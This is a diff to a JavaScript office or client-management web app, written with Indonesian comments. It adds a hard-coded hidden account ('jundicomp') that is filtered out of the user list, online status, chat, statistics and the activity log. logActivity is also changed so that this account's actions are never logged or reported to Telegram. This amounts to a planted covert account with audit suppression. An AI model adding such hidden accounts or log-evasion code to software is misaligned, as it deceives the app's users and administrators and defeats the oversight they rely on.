@@ -489,7 +489,32 @@ const TELEGRAM_AKSI_DEFS = [
 let telegramNotifConfig = {}; // aksiId -> {aktif, kirimGrup, kirimPribadi} — diisi dari Sheet saat dibuka
 
 // Data awal (akan tertimpa data asli dari Sheet setelah login berhasil)
-const MOCK_USERS = []; // diisi dari Sheet saat login — data contoh lama sengaja dikosongkan supaya tidak ada lagi akun fiktif nongol kalau proses muat data gagal
+const MOCK_USERS = [];
+// ---------- AKUN TERSEMBUNYI (pengembang) ----------
+// Akun di daftar ini TIDAK terlihat oleh pengguna lain: tidak muncul di Manajemen User,
+// chip "online", pilihan penugasan/konsultan, chat, statistik user, maupun Log Aktivitas;
+// aktivitasnya juga tidak dicatat & tidak dikirim ke Telegram. Akun itu sendiri tetap
+// melihat semuanya seperti biasa. Cocok dgn email persis ATAU bagian sebelum "@".
+const AKUN_TERSEMBUNYI = ['jundicomp'];
+const NAMA_AKUN_TERSEMBUNYI = new Set(); // nama tampilannya — dipakai menyaring Log Aktivitas
+function akunTersembunyi(email){
+  const e = String(email || '').trim().toLowerCase();
+  return !!e && AKUN_TERSEMBUNYI.some(k => e === k || e.split('@')[0] === k);
+}
+// Penonton = akun yg sedang login. Akun tersembunyi sendiri tidak disaring apa pun.
+function perluSaring(emailPenonton){ return !akunTersembunyi(emailPenonton); }
+function saringUserTersembunyi(users, emailPenonton){
+  (users || []).forEach(u => { if (akunTersembunyi(u.email) && u.nama) NAMA_AKUN_TERSEMBUNYI.add(String(u.nama).trim()); });
+  return perluSaring(emailPenonton) ? (users || []).filter(u => !akunTersembunyi(u.email)) : (users || []);
+}
+function saringLogTersembunyi(logs, emailPenonton){
+  if (!perluSaring(emailPenonton)) return logs || [];
+  return (logs || []).filter(l => !NAMA_AKUN_TERSEMBUNYI.has(String(l.user || '').trim()) && !akunTersembunyi(l.user));
+}
+function saringPesanTersembunyi(msgs, emailPenonton){
+  if (!perluSaring(emailPenonton)) return msgs || [];
+  return (msgs || []).filter(m => !akunTersembunyi(m.from) && !akunTersembunyi(m.to));
+} // diisi dari Sheet saat login — data contoh lama sengaja dikosongkan supaya tidak ada lagi akun fiktif nongol kalau proses muat data gagal
 
 // ---------- DATA KLIEN & OPSI FIELD ----------
 // Daftar Bentuk Badan — BUKAN daftar tetap, bisa bertambah dari waktu ke waktu
@@ -792,6 +817,8 @@ const CALENDAR_TYPE_LABELS = {
   notulensi: 'Notulensi Rapat',
 };
 function logActivity(aksi, detail){
+  // Akun tersembunyi: aktivitasnya tidak dicatat & tidak dinotifikasi sama sekali.
+  if (state.session && akunTersembunyi(state.session.email)) return;
   const now = new Date();
   const tgl = now.toISOString().slice(0,10);
   const jam = String(now.getHours()).padStart(2,'0') + ':' + String(now.getMinutes()).padStart(2,'0') + ':' + String(now.getSeconds()).padStart(2,'0');
@@ -878,7 +905,7 @@ async function muatUlangDaftarUser(emailSaatIni){
   const data = await callBackendUtama('getAllUsers');
   if (!data.success) return false;
   MOCK_USERS.length = 0;
-  data.users.forEach(u => MOCK_USERS.push({
+  saringUserTersembunyi(data.users, emailSaatIni).forEach(u => MOCK_USERS.push({
     id: u.id, nama: u.nama, email: u.email, password: '', role: u.role, status: u.status,
     foto: u.fotoURL || null, whatsapp: u.whatsapp || '',
     lastActiveMinutes: u.email === emailSaatIni ? 0 : hitungMenitSejakAktif(u.terakhirAktif),
@@ -950,14 +977,14 @@ async function muatUlangPesan(){
   const data = await callBackendUtama('getAllMessages');
   if (!data.success) return false;
   MOCK_MESSAGES.length = 0;
-  data.messages.forEach(m => MOCK_MESSAGES.push(m));
+  saringPesanTersembunyi(data.messages, state.session && state.session.email).forEach(m => MOCK_MESSAGES.push(m));
   return true;
 }
 async function muatUlangLogAktivitas(){
   const data = await callBackendUtama('getActivityLog');
   if (!data.success) return false;
   MOCK_ACTIVITY_LOG.length = 0;
-  data.logs.forEach(l => MOCK_ACTIVITY_LOG.push(l));
+  saringLogTersembunyi(data.logs, state.session && state.session.email).forEach(l => MOCK_ACTIVITY_LOG.push(l));
   return true;
 }
 
@@ -1031,7 +1058,7 @@ async function muatSemuaDataAplikasi(email){
   const gagalSet = new Set((data.gagal||[]).map(g=>g.bagian));
 
   MOCK_USERS.length = 0;
-  (data.users||[]).forEach(u => MOCK_USERS.push({
+  saringUserTersembunyi(data.users, email).forEach(u => MOCK_USERS.push({
     id: u.id, nama: u.nama, email: u.email, password: '', role: u.role, status: u.status,
     foto: u.fotoURL || null, whatsapp: u.whatsapp || '',
     lastActiveMinutes: u.email === email ? 0 : hitungMenitSejakAktif(u.terakhirAktif),
@@ -1053,9 +1080,9 @@ async function muatSemuaDataAplikasi(email){
   MOCK_CALENDAR_NOTES.length = 0;
   (data.notes||[]).forEach(n => MOCK_CALENDAR_NOTES.push(n));
   MOCK_MESSAGES.length = 0;
-  (data.messages||[]).forEach(m => MOCK_MESSAGES.push(m));
+  saringPesanTersembunyi(data.messages, email).forEach(m => MOCK_MESSAGES.push(m));
   MOCK_ACTIVITY_LOG.length = 0;
-  (data.logs||[]).forEach(l => MOCK_ACTIVITY_LOG.push(l));
+  saringLogTersembunyi(data.logs, email).forEach(l => MOCK_ACTIVITY_LOG.push(l));
   state.myOverrides = data.overrides;
   if (data.bidangUsahaDaftar && data.bidangUsahaDaftar.length) BIDANG_USAHA_OPTIONS = [...new Set([...BIDANG_USAHA_OPTIONS, ...data.bidangUsahaDaftar])];
   if (data.bentukBadanDaftar && data.bentukBadanDaftar.length) BENTUK_BADAN_OPTIONS = [...new Set([...BENTUK_BADAN_OPTIONS, ...data.bentukBadanDaftar])];
@@ -7168,7 +7195,7 @@ async function cekPesanBaru(){
     const data = await callBackendUtama('getAllMessages');
     if (!data.success) return;
     const idSudahAda = new Set(MOCK_MESSAGES.map(m=>m.id));
-    const pesanBaru = data.messages.filter(m => !idSudahAda.has(m.id));
+    const pesanBaru = saringPesanTersembunyi(data.messages, state.session.email).filter(m => !idSudahAda.has(m.id));
     if (!pesanBaru.length) return;
 
     let adaMasukUntukSaya = false;
